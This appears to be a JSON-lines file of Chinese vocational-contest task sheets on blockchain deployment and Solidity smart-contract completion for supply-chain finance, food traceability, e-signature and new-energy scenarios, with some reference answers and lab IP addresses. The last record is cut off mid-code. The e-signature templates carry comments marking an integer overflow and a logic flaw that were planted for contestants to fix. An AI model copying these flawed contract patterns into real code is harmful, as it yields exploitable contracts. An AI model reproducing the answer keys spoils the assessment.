{"id":0,"name":"广东省选拔赛","type":"省赛","vmList":["192.168.101.84","192.168.101.86","192.168.101.87"],"content":"# 2025年全国职业院校技能大赛 (高职组)\n\n\n## “区块链技术应用”赛项赛卷（2卷）\n\n任务书\n参赛队编号：              \n\n背景描述\n在供应链金融这个万亿级市场中，区块链正在快速商业化落地，助力产业革新。基于区块链的供应链金融业务的理念是：以源自企业的应收账款为底层资产，通过区块链技术实现债券凭证的转让拆分。其中，在原始资产上链时，通过对应收账款进行审核校验，确认贸易关系和身份真实有效，和保证上链资产的真实可信。再者，债权凭证可基于供应链进行层层拆分与流转，都可完整追溯到最底层资产，以实现核心企业和金融机构对供应商的“信用穿透”。\n某公司规划开发一个区块链供应链金融平台，包括核心企业、供应商、银行等角色，通过智能合约代码逐步构建区块链供应链金融平台的基本功能，实现银行向核心企业提供授信并发行数字凭证，企业与企业之间转让数字凭证。此外需要完成区块链供应链金融平台的前后端，实现基本的业务逻辑。\n\n\n### 模块一：区块链产品方案设计及系统运维（35分）\n\n**选手完成本模块的任务后，将任务中设计结果、运行代码、运行结果等截图粘贴至客户端桌面【区块链技术应用赛\\重命名为工位号\\模块一提交结果.docx】中对应的任务序号下。**\n\n#### 任务1-1：区块链产品需求分析与方案设计（10分）\n\n本环节需要依据项目背景完成需求分析与方案设计，具体要求如下:\n\n1. 依据给定供应链金融管理系统的业务架构图，对考题进行业务分析，尽可能多的去考虑一个业务系统所需要的模块，使用Visio或思维导图工具展现本系统的基本设计概念和处理流程，要求分为区块链供应链业务平台和支撑平台两个部分；（4分）\n2. 根据供应链系统设计，在系统中分别包括用户和凭证票据管理功能，在融资凭证上链过程中需要包括银行、核心企业、供应商公司的基本管理功能。根据描述，设计区块链系统的总体功能概览图。（3分）\n3. 整合上述设计内容，完善“供应链金融管理系统概要设计说明书.doc”，具体工作内容如下：\n\n - 将设计内容根据说明书中模块需求进行补充，并完善概要设计说明书中的“需求概要”（1分）\n - 完善说明书中接口说明部分内容。（2分）\n\n#### 任务1-2：区块链系统部署与运维（15分）\n\n围绕供应链金融区块链平台部署与运维需求，进行项目相关系统、节点以及管理工具的部署工作。通过通过监控工具完成对网络、节点服务的监控。最终利用业务需求规范，完成系统日志、网络参数、节点服务等系统结构的维护。\n\n1. 根据参数与端口设置要求，部署区块链系统并验证；\n2. 根据参数与端口设置要求，部署区块链网络管理平台并验证；\n3. 基于区块链系统相关管理平台，按照任务指南实施系统运维工作并验证。\n4. 基于区块链系统相关监管工具，按照任务指南对区块链系统进行监管。\n\n\n#### 子任务1-2-1： 搭建区块链系统并验证（4分）\n\n基于给定服务器环境以及软件（地址“/root/tools”），使用Docker以默认配置安装单机4节点的区块链系统，并完成控制台工具的部署：\n\n1. 完成系统搭建配置与启动。（1分）\n2. 使用基于Docker命令查看区块链系统状态。（1分）\n3. 检查区块链系统节点node0连接状态输出。（1分）\n4. 配置控制台，管理相关证书并启动。（1分）\n\n\n#### 子任务1-2-2：区块链管理平台部署与验证（4分）\n\n基于给定服务器环境以及软件（地址“/root/tools”），按要求部署区块链管理平台，具体工作如下：\n\n1. 配置Mysql数据库（1分）\n2. 配置管理平台连接区块链系统（1分）\n3. 使用命令启动管理平台服务（1分）\n4. 验证管理平台启动情况（1分）\n\n\n#### 子任务1-2-3：区块链系统节点运维（3分）\n\n基于已完成的区块链系统与管理平台搭建工作，开展相关节点运维工作：\n\n1. 生成新节点(node4)，启动并检查（1分）\n2. 修改新节点配置，并查看节点的nodeid（1分）\n3. 将新节点作为观察节点加入group1当中，并检查是否加入成功（1分）\n\n\n#### 子任务1-2-4：区块链系统管理平台运维（4分）\n\n基于已部署的区块链系统管理平台，进行系统相关运维工作：\n\n1. 基于管理平台功能页面，添加新主机（2分）\n2. 基于管理平台功能页面，修改新节点（node4）节点状态，并监控。（2分）\n\n\n#### 任务1-3：区块链系统测试（10分）\n\n设计对区块链系统的测试流程；结合实际业务需求，调用部署的智能合约中进行系统测试、性能测试等；根据业务需求，分析并且修复给定智能合约中的安全漏洞。利用模拟业务和测试工具来完成对区块链系统服务数据的测试。\n\n1. 基于WeBASE的部署脚本完成WeBASE环境搭建以及搭建结果验证，最后将执行结果截图保存。（3分）\n2. 实现WeBASE平台部署。（1分）\n3. 实现webase.sgin功能启动情况验证。（1分）\n4. webase-node-mgr进程启动情况验证和浏览器验证。（1分）"}
{"id":1,"name":"测试赛项","type":"选拔","vmList":["192.168.101.84"],"content":"# 2026年全国职业院校技能大赛 (高职组)\n\n\n## “区块链技术应用”赛项赛卷（2卷）\n\n任务书\n参赛队编号：              \n\n背景描述\n在供应链金融这个万亿级市场中，区块链正在快速商业化落地，助力产业革新。基于区块链的供应链金融业务的理念是：以源自企业的应收账款为底层资产，通过区块链技术实现债券凭证的转让拆分。其中，在原始资产上链时，通过对应收账款进行审核校验，确认贸易关系和身份真实有效，和保证上链资产的真实可信。再者，债权凭证可基于供应链进行层层拆分与流转，都可完整追溯到最底层资产，以实现核心企业和金融机构对供应商的“信用穿透”。\n某公司规划开发一个区块链供应链金融平台，包括核心企业、供应商、银行等角色，通过智能合约代码逐步构建区块链供应链金融平台的基本功能，实现银行向核心企业提供授信并发行数字凭证，企业与企业之间转让数字凭证。此外需要完成区块链供应链金融平台的前后端，实现基本的业务逻辑。\n\n\n### 模块一：区块链产品方案设计及系统运维（35分）\n\n**选手完成本模块的任务后，将任务中设计结果、运行代码、运行结果等截图粘贴至客户端桌面【区块链技术应用赛\\重命名为工位号\\模块一提交结果.docx】中对应的任务序号下。**\n\n#### 任务1-1：区块链产品需求分析与方案设计（10分）\n\n本环节需要依据项目背景完成需求分析与方案设计，具体要求如下:\n\n1. 依据给定供应链金融管理系统的业务架构图，对考题进行业务分析，尽可能多的去考虑一个业务系统所需要的模块，使用Visio或思维导图工具展现本系统的基本设计概念和处理流程，要求分为区块链供应链业务平台和支撑平台两个部分；（4分）\n2. 根据供应链系统设计，在系统中分别包括用户和凭证票据管理功能，在融资凭证上链过程中需要包括银行、核心企业、供应商公司的基本管理功能。根据描述，设计区块链系统的总体功能概览图。（3分）\n3. 整合上述设计内容，完善“供应链金融管理系统概要设计说明书.doc”，具体工作内容如下：\n\n - 将设计内容根据说明书中模块需求进行补充，并完善概要设计说明书中的“需求概要”（1分）\n - 完善说明书中接口说明部分内容。（2分）\n\n#### 任务1-2：区块链系统部署与运维（15分）\n\n围绕供应链金融区块链平台部署与运维需求，进行项目相关系统、节点以及管理工具的部署工作。通过通过监控工具完成对网络、节点服务的监控。最终利用业务需求规范，完成系统日志、网络参数、节点服务等系统结构的维护。\n\n1. 根据参数与端口设置要求，部署区块链系统并验证；\n2. 根据参数与端口设置要求，部署区块链网络管理平台并验证；\n3. 基于区块链系统相关管理平台，按照任务指南实施系统运维工作并验证。\n4. 基于区块链系统相关监管工具，按照任务指南对区块链系统进行监管。\n\n\n#### 子任务1-2-1： 搭建区块链系统并验证（4分）\n\n基于给定服务器环境以及软件（地址“/root/tools”），使用Docker以默认配置安装单机4节点的区块链系统，并完成控制台工具的部署：\n\n1. 完成系统搭建配置与启动。（1分）\n2. 使用基于Docker命令查看区块链系统状态。（1分）\n3. 检查区块链系统节点node0连接状态输出。（1分）\n4. 配置控制台，管理相关证书并启动。（1分）\n\n\n#### 子任务1-2-2：区块链管理平台部署与验证（4分）\n\n基于给定服务器环境以及软件（地址“/root/tools”），按要求部署区块链管理平台，具体工作如下：\n\n1. 配置Mysql数据库（1分）\n2. 配置管理平台连接区块链系统（1分）\n3. 使用命令启动管理平台服务（1分）\n4. 验证管理平台启动情况（1分）\n\n\n#### 子任务1-2-3：区块链系统节点运维（3分）\n\n基于已完成的区块链系统与管理平台搭建工作，开展相关节点运维工作：\n\n1. 生成新节点(node4)，启动并检查（1分）\n2. 修改新节点配置，并查看节点的nodeid（1分）\n3. 将新节点作为观察节点加入group1当中，并检查是否加入成功（1分）\n\n\n#### 子任务1-2-4：区块链系统管理平台运维（4分）\n\n基于已部署的区块链系统管理平台，进行系统相关运维工作：\n\n1. 基于管理平台功能页面，添加新主机（2分）\n2. 基于管理平台功能页面，修改新节点（node4）节点状态，并监控。（2分）\n\n\n#### 任务1-3：区块链系统测试（10分）\n\n设计对区块链系统的测试流程；结合实际业务需求，调用部署的智能合约中进行系统测试、性能测试等；根据业务需求，分析并且修复给定智能合约中的安全漏洞。利用模拟业务和测试工具来完成对区块链系统服务数据的测试。\n\n1. 基于WeBASE的部署脚本完成WeBASE环境搭建以及搭建结果验证，最后将执行结果截图保存。（3分）\n2. 实现WeBASE平台部署。（1分）\n3. 实现webase.sgin功能启动情况验证。（1分）\n4. webase-node-mgr进程启动情况验证和浏览器验证。（1分）"}
{"id":2,"name":"食品溯源智能合约","type":"省赛","vmList":["192.168.101.86"],"content":"# 模块二：智能合约开发与测试（30分）\n**选手完成本模块的任务后，将任务中设计结果、运行代码、运行结果等截图粘贴至客户端桌面【工位号文件夹\\模块二提交结果.docx】中对应的任务序号下。**\n\n## 任务2-1：智能合约设计\n根据区块链食品溯源产品需求分析和设计文档的描述，编写该区块链产品的智能合约功能需求文档，设计该智能合约设计图。具体要求如下： \n\n（1）完成区块链食品溯源智能合约的设计图  \n设计区块链食品溯源智能合约接口，画出区块链食品溯源各智能合约关系的UML时序图。\n\n（2）编写区块链食品溯源智能合约功能需求文档 \n结合区块链食品溯源产品项目背景和用例图，需求分析，功能设计等。编写该区块链食品溯源产品的智能合约功能需求文档。\n\n## 任务2-2：智能合约开发\n使用Solidity语言完成智能合约开发、部署和调用，要求如下：\n\n### 1.食品信息（FoodInfoItem）的接口编码\n（1）编写食品信息实体的接口，完成可溯源食品信息初始化，实现可追溯的原始生产商食品信息上链功能；\n| 名称              | 说明         |\n| ----------------- | ------------ |\n| _currentTraceName | 当前用户名   |\n| _name             | 食品名称     |\n| _owner            | 合约的创建者 |\n| _quality          | 质量         |\n| _status           | 状态         |\n| _traceName        | 用户名       |\n| _timestamp        | 流转时间戳   |\n| _traceAddress     | 用户地址     |\n| _traceQuality     | 食品质量     |\n\n（2）编写分销商食品上链信息接口，根据食品溯源智能合约地址获取分销商上链食品的信息；\n\n \n（3）编写超市进行食品上链信息的接口，根据食品溯源智能合约地址获取超市上链食品信息。\n\n\n### 2.食品溯源(Trace)的接口编码\n（1）编写食品溯源智能合约生产商Producer添加食品接口，必须生产商才能添加可溯源的食品，实现溯源功能；\n\n（2）编写食品溯源智能合约分销商Distributor添加食品接口，必须分销商才能添加可溯源的食品，实现溯源功能；\n\n（3）编写食品溯源智能合约超市Retailer添加食品接口，必须超市才能添加可溯源的食品，实现溯源功能。\n\n### 3.角色（Role）管理的接口编码\n（1）编写食品溯源增加角色接口，必须是未增加的角色才能被添加，实现添加角色的功能；\n\n（2）编写食品溯源移除角色接口，必须是已增加的角色才能被移除，实现移除角色的功能； \n\n（3）编写食品溯源角色授权接口，必须是授权的角色地址，实现角色权限管理功能。\n\n### 4.合约编译、部署和调用\n（1）解决代码错误和警告，正确编译所有合约并部署合约，成功获取部署的合约地址和abi，并将完成结果进行截图。\n\n（2）调用食品信息（FoodInfoItem）接口的智能合约并验证食品信息合约中的业务流程。"}
{"id":3,"name":"金融供应链智能合约开发","type":"省赛","vmList":["192.168.101.86"],"content":"# 模块二：智能合约开发与测试（30分）\n选手完成本模块的任务后，将任务中设计结果、运行代码、运行结果等截图粘贴至客户端桌面【工位号文件夹\\模块二提交结果.docx】中对应的任务序号下。\n## 任务2-1：智能合约设计\n根据区块链供应链金融应用需求分析和方案设计文档的描述，编写该区块链产品的智能合约功能需求文档，以及设计该智能合约设计图，具体要求如下：\n1.完成区块链供应链金融智能合约的设计图\n设计区块链供应链金融智能合约接口，以及画出区块链供应链金融各角色智能合约的UML时序图。\n\n1.编写区块链供应链金融智能合约功能需求文档\n根据区块链供应链金融产品项目背景和需求分析，编写该区块链供应链金融产品的智能合约功能需求文档；\n\n## 任务2-2：智能合约开发\n使用Solidity语言完成智能合约开发、部署和调用，要求如下：\n### 1.供应链金融实体信息编码（6分）\n（1）编写供应链金融智能合约的实体接口，完成实体通用数据的初始化，实现企业和票据实体信息上链的功能；（2分）\n表2.2.2.1 SupplyChain实体说明、\n| ***名称***     | ***类型*** | ***说明*** |\n| ------------------ | -------------- | -------------- |\n| companyName        | string         | 公司名称       |\n| companyAddress     | address        | 公司地址       |\n| creditAsset        | uint           | 信用资产       |\n| acceptReceiptIndex | uint[]         | 接收的凭证     |\n| sendReceiptIndex   | uint[]         | 发送的凭证     |\n| senderAddress      | address        | 发送票据的地址 |\n| accepterAddress    | address        | 接收票据的地址 |\n| receiptType        | uint8          | 凭证类型       |\n| transferType       | uint8          | 交易类型       |\n| amount             | uint           | 交易数量       |\n\n```javascript\n//公司信息结构体\n    struct Company {\n        //①公司名称\n        //②公司地址\n        //③信用资产\n        //④接收的凭证\n        //⑤发送的凭证\n    }\n\n//数字发票收据信息\n    struct Receipt {\n        //⑥发送票据的地址\n        //⑦接收票据的地址\n        //⑧凭证类型\n        //⑨交易类型\n        //⑩交易数量\n    }\n```\n\n（2）编写企业上链信息接口，实现供应链金融的企业信息上链；（2分）\n\n``` javascript\nfunction addCompany(string name, address companyAddress) returns(bool) {\n        //①实例化公司\n        //②添加公司地址\n        //③将实例化的公司添加到公司映射\n        //④返回添加成功标识\n    }\n\n```\n\n\n（3）基于给定的智能合约代码以及注释，完成银行向企业交易的接口函数；（2分）\n\n```javascript\nfunction bankToCompanyReceipt(address senderAddress, address accepterAddress, uint amount, uint8 receiptType) returns(uint) {\n①判断接收地址存在\n        ②实例化银行\n        ③实例化公司\n        if (keccak256(bank.bankName) == keccak256(\"\")) {\n            return 404001;\n        }\n        //确认公司存在\n        if (keccak256(company.companyName) == ④) {\n            return 404002;\n        }\n        if (bank.creditAsset < amount) {\n            return 500001;\n        }\n```\n\n### 2.供应链金融公司与公司接口编码（6分）\n（1）编写公司与公司之间进行交易的历史存证上链接口，实现公司与公司之间的交易功能；（2分）\n```javascript\nfunction companyToCompanyReceipt(①, address accepterAddress, uint amount, uint8 receiptType) returns(uint) {\n        \n        //②接收地址判断\n        Company memory senderCompany = companyMap[③];\n        Company memory ④ = companyMap[accepterAddress];\n        //确认发送公司存在\n        if (keccak256(senderCompany.⑤) == keccak256(\"\")) {\n            return 404001;\n        }\n        \n        //确认接收公司存在\n        if (keccak256(accepterCompany.companyName) == ⑥) {\n            return 404002;\n        }\n        \n        //如果存证接收的公司资产小于存证数额，那么就不能交易发送存证\n        if (accepterCompany.creditAsset ⑦ ⑧) {\n            return 500001;\n        }\n```\n\n\n（2）编写创建存证的接口，实现创建存证的功能；（2分）\n```javascript\nReceipt memory newReceipt = Receipt(①, accepterAddress, receiptType, 2, amount);\n        receiptIndex += 1;\n        //记录存证（存证Map，公司Map对应地址的发送和接收存证列表）\n        receiptMap[receiptIndex] = ②;\n        companyMap[③].sendReceiptIndex.push(receiptIndex);\n        companyMap[accepterAddress].acceptReceiptIndex.push(④);\n```\n\n（3）编写交易金额数量变化的接口，实现凭证交易双方资金的变化功能；（2分）\n```javascript\ncompanyMap[①].creditAsset ② amount;\n        companyMap[③].creditAsset ④ amount;\n        return 200;\n    }\n```\n\n\n### 3.供应链金融公司与银行交易的接口编码（4分）\n（1）编写公司与银行之间进行交易的历史存证上链接口，实现公司与银行之间的交易功能；（2分）\n\n```javascript\nfunction companyToBankReceipt(address senderAddress, ①, uint amount, uint8 receiptType) returns(uint) {\n\n        ②\n        \n        Bank memory bank = bankMap[senderAddress];\n        Company memory accepterCompany = companyMap[③];\n        \n        //确认发送公司存在\n        if (keccak256(bank.bankName) == ④) {\n            return 404001;\n        }\n        \n        //确认接收公司存在\n        if (keccak256(accepterCompany.companyName) == keccak256(\"\")) {\n            return 404002;\n        }\n        \n        //如果存证接收的公司资产小于存证数额，那么就不能交易发送存证\n        if (accepterCompany.creditAsset < amount) {\n            return 500001;\n        }\n```\n\n\n（2）编写创建存证的接口，实现创建存证的功能；（1分）\n```javascript\n//创建存证\n        Receipt memory newReceipt = Receipt(senderAddress, accepterAddress, ①, 3, amount);\n        receiptIndex ② 1;\n        receiptMap[③] = newReceipt;\n        bankMap[senderAddress].sendReceiptIndex.push(receiptIndex);\n        companyMap[accepterAddress].④;\n```\n\n（3）编写交易金额数量变化的接口，实现凭证交易双方资金的变化功能；（1分）\n```javascript\nbankMap[senderAddress].① ② amount;\ncompanyMap[accepterAddress].③ ④ amount;\n        return 200;\n}\n```\n\n\n\n### 4.合约编译、部署和调用（4分）\n（1）解决代码错误和警告，正确编译并部署合约，成功获取部署的合约地址和abi。（1分）\n（2）调用食品溯源智能合约的接口，完整验证业务流程。（3分）"}
{"id":4,"name":"电子签章智能合约","type":"省赛","vmList":["192.168.101.86"],"content":"# 模块二：智能合约开发与测试（30分）\n选手完成本模块的任务后，将任务中设计结果、运行代码、运行结果等截图粘贴至客户端桌面【区块链技术应用赛\\重命名为工位号\\模块二.docx】中对应的任务序号下。\n\n## 任务2-1：智能合约设计\n根据区块链电子签章应用需求分析和方案设计文档的描述，编写该区块链产品的智能合约功能需求文档，以及设计该智能合约UML图，具体要求如下：\n1.编写区块链电子签章智能合约功能需求文档\n根据区块链电子签章产品项目背景和需求分析，编写该区块链电子签章产品的智能合约功能需求文档。\n\n2.完成区块链电子签章智能合约的设计图\n设计区块链电子签章智能合约接口，画出区块链电子签章智能合约的角色UML用例图，以及画出区块链电子签章智能合约关系的时序图。\n\n## 任务2-2：智能合约开发\n使用Solidity语言进行智能合约开发，根据需求用例文档在待补充源码中完成程序接口功能的编码，解决代码错误和警告，正确编译合约，功能调试正确，运行合约进行业务功能的验证，成功获取合约的abi。\n\n### 子任务2-2-1：多人签章合约(MultiSeal)接口编码\n（1）实例化合约，设置状态为START(1分)\n```javascript\nconstructor(address address, string _code, uint _number, address[] memory _accounts) public {\n        //1. 实例化\n    }\n```\n\n（2）判断签章状态(2分)\n```javascript\n//1. 以遍历的方式查询recordMap对应地址签章情况\n\t//2. 如果未签名则返回false，否则返回true\n\tfunction isFinish() view internal returns(bool) {\n        for (uint index = 0; index < accounts.length; ++index) {\n            选手填写内容\n        }\n        return true;\n    }\n```\n\n（3）签章功能编码(2分)\n```javascript\n// 1. require判断状态为START或SIGNING，否则不能执行\n// 2. 进行签章\n// 3. 判断是否完成，如果完成修改状态\n\nfunction sign(address _address,string _hash,string _datetime) public {\n        require(选手填写内容,\"status is error\");\n        RecordInfo storage recordInfo = recordMap[_address];\n        选手填写内容 //签章\n        status = SignStatus.SIGNING;\n\n        //设置签章状态\n        if(isFinish()) {\n            hash = _hash;\n            status = 选手填写内容;\n        }\n}\n```\n\n\n（4）根据签章人获取多人签章信息（3分）\n```javascript\n// 1. 判断地址形式是否正确\n// 2. 以循环的方式遍历accounts变量与传入地址匹配\n// 3. 如果匹配正确则返回签章文件编号\nfunction multiSingInfoFromSigner(address _address) view public returns(string memory) {\n        require(选手填写内容);\n        for (uint index = 0; index < accounts.length; ++index) {\n            if (选手填写内容) {\n                return 选手填写内容;\n            }\n        }\n}\n```\n\n### 子任务2-2-2： 电子签章合约（ElectronicSeal）接口编码\n（1）添加签章账户功能（3分）\n```javascript\n//1. 添加签章及其对应的Mapping\n//2. 触发AddSealAccountEvent事件\nfunction addSealAccount(address _account,string _name,string _cardId,string _data,string _datetime) public onlyOwner{\n        Seal seal = 选手填写内容;\n        sealMap[_account] = 选手填写内容;\n        signerMap[_account] = 选手填写内容;\n        counter++; //整数溢出漏洞\n        emit 选手填写内容 //触发事件\n}\n```\n\n（2）添加签章信息(sealSignature)（3分）\n```javascript\n//1. 通过require判断_account地址合法\n//2. 添加签章\n//3. 触发SealSignature事件\nfunction sealSignature(address _account,string _hash,string _code,string _datetime) public onlyOwner{\n        require(选手填写内容);\n        Seal seal = sealMap[_account];\n        if (seal.getIsUsed()) {\n            选手填写内容 //添加签章\n        }\n        emit 选手填写内容; //代码逻辑漏洞\n}\n```\n\n（3）获取多人签约信息（1分）\n```javascript\n// 1. 获取多人签章合约对象实例\n// 2. 返回多人签章信息\nfunction getMultiSingInfo(string _code) public view onlyPromoterOrSinger returns(string,address,string,uint,address[] memory) {\n        MultiSeal  multiSeal = 选手填写内容;\n        return 选手填写内容;\n}\n```\n\n（4）判断多人签章文件编号是否存在（1分）\n```javascript\n//①遍历所有多人签章文件编号并与传入签章文件编号参数进行比较\n//②返回不存在\n//@dev 判断多人签名文件编号是否存在\n//@param _code 签章文件编号\n//@return bool true:存在 false：不存在\nfunction isExistMultiCode(string _code) view internal returns(bool) {\n   for (uint index = 0; index < codes.length; ++index) {\n       if (keccak256(bytes(_code)) == keccak256(bytes(codes[index]))) {\n                return 选手填写内容;\n            }\n        }\n    return 选手填写内容;\n}\n```\n\n### 子任务2-2-3：合约编译、部署和调用\n在/fisco目录下使用start.sh启动合约测试环境。启动成功后访问指定虚拟平台(http://localhost:5002/WeBASE-Front)，将完成代码拷贝至执行合约编辑文件并完成以下操作，具体内容如下：\n（1）解决代码错误和警告，正确编译并部署合约，成功获取部署的合约地址和abi；\n   （2）调用区块链电子签章智能合约的接口（至少3项），完成验证业务流程。"}
{"id":5,"name":"新能源智能合约开发","type":"省赛","vmList":["192.168.101.86"],"content":"# 模块二：智能合约开发与测试\n## 任务2-1：设计智能合约\n基于“新能源管理”业务逻辑，设计智能合约结构图，以文字的形式描述智能合约实现的总体功能以及配套模块的子功能\n### 子任务2-1-1 编写新能源智能合约功能需求文档\n根据区块链新能源管理项目背景和需求分析，编写该区块链新能源管理的智能合约功能需求文档。\n\n参考答案：\n1. 具备合约用户管理功能，包括用户注册与登录功能，注册功能用于实现用户数据插入。用于实现合约的准入机制，提高合约的安全性。\n\n2. 具备合约资产管理功能，包括资产数据的新增、修改、交易、删除与查询模块。其中增删改查功能用于支撑区块链应用的实现，交易功能实现资产所有权的换绑\n\n3. 具备合约能源管理功能，包括能源数据的新增、修改、交易、删除与查询模块。其中增删改查功能用于支撑区块链应用的实现，交易功能实现用于绑定能源信息的变化与订单记录。\n\n子任务2-1-2\t完成区块链新能源管理智能合约的设计\n1. 设计区块链新能源管理智能合约接口，画出区块链新能源管理智能合约的角色UML用例图。\n参考答案：\n\n2. 以图文结合的方式描述智能合约各参与实体间的关系。\n参考答案：\n1、新能源管理智能合约中需包含用户模块、资产模块、能源模块。首先，需要通过用户模块新增用户信息，当资产模块与能源模块需要有数据插入时，新数据需要与用户模块绑定，不能独立存在。\n2、当资产模块中的资产所有权发生变化时，需要修改对应资产信息进行换绑。\n3、当能源模块中存在能源交易时，对应用户绑定能源信息要发生变化\n\n\n## 任务2-2：使用Solidity语言进行智能合约开发；\n### 子任务2-2-1：太阳能板管理接口编码\n1. 根据文档要求，编写太阳能板新增接口功能，必须将新增太阳能板数据存入指定表中，在存储完成后需触发后事件并返回存储与否的标识。\n\n完善SolarPanelsStorage.sol文件中的insert函数，具体内容如下：\n\n2. 根据文档要求，编写太阳能板修改接口，必须通过指定表修改完成数据更新，在完成更新后需触发事件并返回更新与否的标识。\n\n完善SolarPanelsStorage.sol文件中的update函数，具体内容如下：\n\n\n### 子任务2-2-2：能源管理接口编码\n1. 根据文档要求，编写能源新增接口功能，必须将新增能源数据存入指定表中，在存储完成后需触发后事件并返回存储与否的标识。\n\n完善EnergyStorage.sol文件中的update函数，具体内容如下：\n\n2. 根据文档要求，编写能源修改接口，必须通过指定表修改完成数据更新，在完成更新后需触发事件并返回更新与否的标识。\n\n完善EnergyStorage.sol文件中的update函数，具体内容如下：\n\n### 子任务2-2-3：合约部署和调用\n1. 解决代码错误和警告，正确编译并部署合约，成功获取部署的合约地址和abi。（1分）\n\n2. 调用太阳能板查询合约接口，完整验证业务流程。"}
{"id":6,"name":"金砖食品溯源智能合约开发","type":"国赛","vmList":["192.168.101.86"],"content":"## 模块二：智能合约开发与测试（30分）\n### 任务2-1：智能合约设计（5分）\n1. 根据区块链食品溯源应用需求分析和方案设计文档的描述，设计智能合约功能。（2分）\n参考答案：\n（1）食品数据记录功能：\n智能合约可以记录每个食品的生产、加工、运输、销售等环节的数据和信息，确保食品的溯源信息被保存在区块链上，实现数据的不可篡改性和可信度。\n（2）食品数据查询功能：\n智能合约可以根据特定的食品编号、批次号、生产日期等信息，查询该食品的溯源信息，实现数据的可查询性和可追溯性。\n（3）用户权限管理功能：\n智能合约可以实现基于角色的用户权限管理，确保数据的安全和隐私。\n（4）数据防篡改功能：\n智能合约可以使用哈希算法实现数据的防篡改性，保证数据的真实性和可信度。\n（5）食品溯源追溯功能：\n智能合约可以根据特定的食品编号、批次号、生产日期等信息，追溯该食品的生产、加工、运输、销售等环节的数据和信息，实现食品溯源的追溯和溯源查询功能。\n（6）食品检测结果验证功能：\n智能合约可以记录食品检测结果，并根据结果判断食品是否符合标准。通过智能合约的验证，确保食品的质量和安全性。\n\n2. 设计智能合约中各角色应具备的功能。（1分）\n参考答案：\n（1）食品生产企业：\n食品生产企业是智能合约食品溯源系统的核心参与方，负责上传食品的生产信息。其需要通过智能合约验证身份和食品信息的真实性，并获得上传食品信息的权限。此外，食品生产企业还需要配合智能合约进行食品安全审核，确保上传的食品信息符合安全标准。\n（2）食品经销商：\n食品经销商是智能合约食品溯源系统中的中间环节，负责食品的采购和销售。其需要通过智能合约查询和验证食品的信息，并在销售时向客户提供食品的溯源信息。此外，食品经销商还需要配合智能合约进行食品安全审核，确保销售的食品符合安全标准。\n（3）食品消费者：\n食品消费者是智能合约食品溯源系统中的最终受益方，负责消费食品并通过智能合约查询食品的生产信息。消费者可以通过扫描食品上的二维码或输入食品的溯源码查询食品的生产、加工、运输等信息，并了解食品的安全性。\n\n（4）食品监管机构：\n食品监管机构是智能合约食品溯源系统中的监管参与方，负责监督食品的生产、销售和消费过程。其需要通过智能合约查询和监控食品的生产和销售信息，并在发现食品安全问题时及时采取措施。\n\n3. 设计智能合约中食品安全溯源功能。（2分）\n参考答案：\n（1）食品信息上传：\n食品生产企业可以通过智能合约将其生产过程中的各种信息上传到区块链上，如食品名称、生产时间、生产地点、生产厂家等信息。在上传信息时，智能合约需要验证信息的合法性，并分配唯一的编号作为该食品的标识符。\n（2）食品信息查询：\n用户可以通过智能合约查询任何食品的溯源信息，只需要提供该食品的编号即可。智能合约会根据该编号在区块链上搜索相关的信息，将其返回给用户。\n（3）食品信息追溯：\n如果出现食品安全问题，用户可以通过智能合约追溯该食品的生产过程，并确定问题的源头。智能合约会根据食品编号在区块链上逐层追溯相关信息，并将其返回给用户。\n（4）智能合约的奖励机制：\n为了鼓励参与方积极参与食品安全溯源系统，智能合约可以设立奖励机制。例如，食品生产企业上传的信息越详细、越准确，其所获得的奖励就越高。\n（5）智能合约的数据验证：\n智能合约应该能够验证上传的食品信息的真实性和合法性。如果上传的信息不符合规定，智能合约会拒绝其上传，并通知相关的参与方进行纠正。\n（6）智能合约的溯源机制：\n智能合约应该能够根据食品编号在区块链上逐层追溯食品的生产过程，并将其记录在区块链上。同时，智能合约还应该能够对数据进行审核和验证，确保数据的真实性和可信度。\n（7）智能合约的权限管理：\n智能合约应该能够对参与方进行权限管理，确保数据的安全和隐私。例如，只有经过验证的食品生产企业才能上传食品信息，其他未经授权的参与方不能修改或删除已有的数据。\n\n## 任务2-2：智能合约开发（20分）\n### 1.食品信息（Food）、成员信息(Member)、生产订单信息(Productions)的结构体功能编码（6分）\n（1）编写食品信息实体功能。（2分）\n| 名称       | 类型   | 说明     |\n| ---------- | ------ | -------- |\n| id         | uint   | 食品编号 |\n| name       | string | 食品名称 |\n| foodType   | string | 食品类型 |\n| quality    | string | 质量     |\n| spec       | string | 规格     |\n| other      | string | 其他信息 |\n| updateTime | uint   | 更新时间 |\n\n```javascript\nstruct Food{\n    //①食品编号id\n    //②食品名称name\n    //③食品类型foodType\n    //④质量quality\n    //⑤规格spec\n    //⑥其他信息other\n    //⑦更新时间updateTime\n}\n```\n\n（2）完善智能合约中用户结构体内容（2分）\n| 名称         | 类型    | 说明                                          |\n| ------------ | ------- | --------------------------------------------- |\n| company      | string  | 公司名称                                      |\n| location     | string  | 地址                                          |\n| tel          | string  | 电话                                          |\n| incharge     | string  | 负责人                                        |\n| mainBusiness | string  | 主营业务                                      |\n| credit       | uint    | 信誉分                                        |\n| businessType | uint    | 成员类型(1:生产商 2:收购商 3:运输商 4:销售商) |\n| userAddress  | address | 创建用户地址                                  |\n| updateTime   | uint    | 更新时间                                      |\n\n```javascript\nstruct Member {\n        //①公司名称\n        string location;//地址\n        //②电话\n        string incharge;//负责人\n        string mainBusiness;//主营业务\n        uint credit;//信誉值\n        //③成员类型(1:生产商 2:收购商 3:运输商 4:销售商)\n       //④创建用户地址;\n        uint updateTime;\n    }\n\n```\n\n\n（3）编写生产订单(Productions)结构体信息。（2分）\n| 名称       | 类型    | 说明                              |\n| ---------- | ------- | --------------------------------- |\n| orderNo    | uint    | 溯源订单号                        |\n| produceNo  | uint    | 生产订单号                        |\n| orderType  | uint    | 订单类型(1: 直接付款  2:凭证付款) |\n| foodId     | uint    | 食品编号                          |\n| price      | uint    | 单价                              |\n| num        | uint    | 生产数量                          |\n| updateTime | uint    | 更新时间                          |\n| createUser | address | 订单创建人                        |\n\n```javascript\nstruct Productions {\n        //①总订单号\n        //②食品订单号\n        uint orderType;//订单类型(1: 直接付款  2:凭证)\n        uint foodId;//产品编号\n        uint price;//单价\n    \t uint num;//生产数量\n    \t//③更新时间;\n\t\t//④订单创建人\n}\n```\n\n\n### 2.食品溯源(Trace)的接口编码（6分）\n（1）根据食品信息结构体，完成食品信息添加相应功能（2分）\n```javascript\nfunction createFood(①, ②, ③, ④, ⑤, string memory other) public returns(⑥) {\n        foodMap[⑦] = Food(foodId, name, foodType, quality, spec, other, ⑧);\n        emit CreateFood(foodId, name);\n        return 